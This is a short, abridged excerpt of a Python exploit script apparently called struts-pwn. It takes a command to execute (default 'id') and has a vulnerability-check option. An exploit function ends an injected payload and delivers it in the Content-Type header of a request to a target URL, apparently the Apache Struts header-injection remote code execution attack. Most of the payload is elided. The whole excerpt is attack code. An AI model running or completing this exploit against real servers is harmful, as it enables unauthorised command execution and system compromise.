...
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action="store", default="id")
parser.add_argument("--check", dest="do_check", help="Check if a target is vulnerable.", action="store_true")
...
def exploit(url, cmd):
	...
	payload += "(#ros.flush())}"
	headers = {"User-Agent": "struts-pwn (https://github.com/mazen160/struts-pwn)", "Content-Type": str(payload), "Accept": "*/*"}
	timeout = 3
	try:
